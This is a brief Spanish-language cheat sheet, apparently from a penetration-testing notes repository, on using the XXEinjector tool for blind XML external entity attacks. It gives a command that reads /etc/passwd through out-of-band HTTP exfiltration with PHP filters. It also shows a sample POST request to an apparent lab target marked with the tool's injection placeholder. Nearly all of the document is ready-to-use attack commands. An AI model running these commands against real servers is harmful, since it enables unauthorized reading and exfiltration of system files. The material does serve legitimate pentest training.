# XXEInjector Cheat Sheet

#### Ejecutar para leer el archivo /etc/passwd y hacer filtros PHP. Esto genera un archivo log con la respuesta.
```
XXEinjector --host=<IP-Address> --httpport=<PORT> --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

---

> Nota: Guardamos nuestro request en un archivo pero al final donde queremos que ejecute la herramienta utilizamos la palabra "XXEINJECT", ejemplo:
```
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)